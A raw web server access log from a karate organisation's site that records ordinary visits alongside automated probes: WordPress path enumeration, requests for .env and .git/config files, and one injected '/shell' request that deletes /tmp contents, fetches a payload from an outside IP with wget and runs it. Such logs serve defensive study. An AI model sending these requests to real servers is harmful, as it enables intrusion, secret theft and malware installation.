::ffff:66.249.92.207 - - [14/Aug/2023:00:00:04 +0000] "GET /apple-app-site-association HTTP/1.1" 404 165 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:33 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:33 +0000] "GET /wp HTTP/1.1" 404 141 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:34 +0000] "GET /wordpress HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:34 +0000] "GET /username HTTP/1.1" 404 147 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:35 +0000] "GET /WP HTTP/1.1" 404 141 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:35 +0000] "GET /shop HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:36 +0000] "GET /STORE HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:36 +0000] "GET /forum HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:37 +0000] "GET /FORUM HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:37 +0000] "GET /store HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:38 +0000] "GET /SHOP HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:38 +0000] "GET /WordPress HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:39 +0000] "GET /WORDPRESS HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:39 +0000] "GET /up HTTP/1.1" 404 141 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:40 +0000] "GET /blog HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:40 +0000] "GET /new HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:41 +0000] "GET /old HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:41 +0000] "GET /demo HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:42 +0000] "GET /backup HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:42 +0000] "GET /Backup HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:43 +0000] "GET /BACKUP HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:43 +0000] "GET /test HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:44 +0000] "GET /home HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:44 +0000] "GET /2020 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:45 +0000] "GET /2019 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:45 +0000] "GET /site HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:46 +0000] "GET /2018 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:46 +0000] "GET /2017 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:47 +0000] "GET /2016 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:47 +0000] "GET /2015 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:48 +0000] "GET /2014 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:48 +0000] "GET /2013 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:49 +0000] "GET /2012 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:49 +0000] "GET /2010 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:50 +0000] "GET /2009 HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:50 +0000] "GET /BLOG HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:51 +0000] "GET /Blog HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:51 +0000] "GET /NEW HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:52 +0000] "GET /New HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:52 +0000] "GET /DEMO HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:53 +0000] "GET /Demo HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:54 +0000] "GET / HTTP/1.1" 200 57490 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:54 +0000] "GET //wp-login.php HTTP/1.1" 404 152 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:55 +0000] "GET //wp HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:55 +0000] "GET //wordpress HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:56 +0000] "GET //username HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:56 +0000] "GET //WP HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:57 +0000] "GET //shop HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:57 +0000] "GET //STORE HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:58 +0000] "GET //forum HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:58 +0000] "GET //FORUM HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:59 +0000] "GET //store HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:47:59 +0000] "GET //SHOP HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:00 +0000] "GET //WordPress HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:00 +0000] "GET //WORDPRESS HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:01 +0000] "GET //up HTTP/1.1" 404 142 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:01 +0000] "GET //blog HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:02 +0000] "GET //new HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:02 +0000] "GET //old HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:03 +0000] "GET //demo HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:03 +0000] "GET //backup HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:04 +0000] "GET //Backup HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:05 +0000] "GET //BACKUP HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:05 +0000] "GET //test HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:06 +0000] "GET //home HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:06 +0000] "GET //2020 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:07 +0000] "GET //2019 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:07 +0000] "GET //site HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:08 +0000] "GET //2018 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:08 +0000] "GET //2017 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:09 +0000] "GET //2016 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:09 +0000] "GET //2015 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:10 +0000] "GET //2014 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:10 +0000] "GET //2013 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:11 +0000] "GET //2012 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:11 +0000] "GET //2010 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:12 +0000] "GET //2009 HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:12 +0000] "GET //BLOG HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:13 +0000] "GET //Blog HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:13 +0000] "GET //NEW HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:14 +0000] "GET //New HTTP/1.1" 404 143 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:14 +0000] "GET //DEMO HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:103.174.87.250 - - [14/Aug/2023:11:48:15 +0000] "GET //Demo HTTP/1.1" 404 144 "-" "python-requests/2.27.1"
::ffff:80.82.78.39 - - [14/Aug/2023:12:00:44 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0"
::ffff:185.254.196.186 - - [14/Aug/2023:12:01:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.186 - - [14/Aug/2023:12:01:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [14/Aug/2023:12:12:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [14/Aug/2023:12:12:54 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.193.6 - - [14/Aug/2023:12:19:42 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:178.32.197.84 - - [14/Aug/2023:12:22:41 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
::ffff:141.95.74.78 - - [14/Aug/2023:12:24:10 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [14/Aug/2023:12:24:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:63.34.16.55 - - [14/Aug/2023:12:36:49 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:198.199.117.80 - - [14/Aug/2023:12:37:48 +0000] "GET /druid/index.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:135.125.217.54 - - [14/Aug/2023:13:00:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [14/Aug/2023:13:00:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [14/Aug/2023:13:08:32 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET / HTTP/1.1" 200 57490 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:27 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:28 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:31 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:35 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:24:59 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:25:03 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:141.95.74.78 - - [14/Aug/2023:13:28:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [14/Aug/2023:13:28:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.15 - - [14/Aug/2023:13:29:00 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:35.90.234.163 - - [14/Aug/2023:13:32:05 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.88.210.229 - - [14/Aug/2023:13:32:18 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.88.210.229 - - [14/Aug/2023:13:32:21 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:173.239.68.146 - - [14/Aug/2023:13:32:55 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
::ffff:173.239.68.146 - - [14/Aug/2023:13:32:55 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 179 "-" "MobileSafari/8614.4.6.0.6 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:173.239.68.146 - - [14/Aug/2023:13:32:55 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 167 "-" "MobileSafari/8614.4.6.0.6 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:173.239.68.146 - - [14/Aug/2023:13:32:55 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 171 "-" "MobileSafari/8614.4.6.0.6 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:173.239.68.146 - - [14/Aug/2023:13:32:55 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 159 "-" "MobileSafari/8614.4.6.0.6 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:173.239.68.146 - - [14/Aug/2023:13:32:55 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "MobileSafari/8614.4.6.0.6 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:34.215.162.105 - - [14/Aug/2023:13:33:00 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:52.38.171.158 - - [14/Aug/2023:13:33:47 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:52.38.171.158 - - [14/Aug/2023:13:33:48 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.212.17.194 - - [14/Aug/2023:13:34:19 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.208.190.244 - - [14/Aug/2023:13:34:53 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.208.190.244 - - [14/Aug/2023:13:34:55 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.79.162.186 - - [14/Aug/2023:13:35:45 +0000] "GET / HTTP/1.1" 200 57490 "-" "python-requests/2.31.0"
::ffff:60.221.224.113 - - [14/Aug/2023:13:36:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:45.84.139.209 - - [14/Aug/2023:13:38:25 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
::ffff:45.84.139.209 - - [14/Aug/2023:13:38:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Go-http-client/1.1"
::ffff:45.84.139.209 - - [14/Aug/2023:13:38:27 +0000] "GET / HTTP/1.1" 200 57490 "-" "Go-http-client/1.1"
::ffff:45.84.139.209 - - [14/Aug/2023:13:38:28 +0000] "GET /metrics HTTP/1.1" 404 146 "-" "Go-http-client/1.1"
::ffff:45.84.139.209 - - [14/Aug/2023:13:38:28 +0000] "GET /v2/ HTTP/1.1" 404 142 "-" "Go-http-client/1.1"
::ffff:5.196.102.64 - - [14/Aug/2023:13:46:44 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
